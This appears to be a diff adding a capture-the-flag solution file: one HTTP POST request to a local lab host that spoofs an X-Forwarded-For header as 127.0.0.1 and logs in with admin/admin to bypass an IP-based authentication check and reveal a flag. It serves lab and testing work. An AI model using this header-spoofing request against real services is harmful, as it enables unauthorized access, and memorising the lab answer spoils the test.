@@ -1,0 +1,9 @@
+# X-Forwarded-For header spoofing bypasses IP-based authentication check, revealing the flag
+
+POST /index.php HTTP/1.1
+Host: 172.17.0.1:58693
+Content-Type: application/x-www-form-urlencoded
+X-Forwarded-For: 127.0.0.1
+Content-Length: 29
+
+username=admin&password=admin
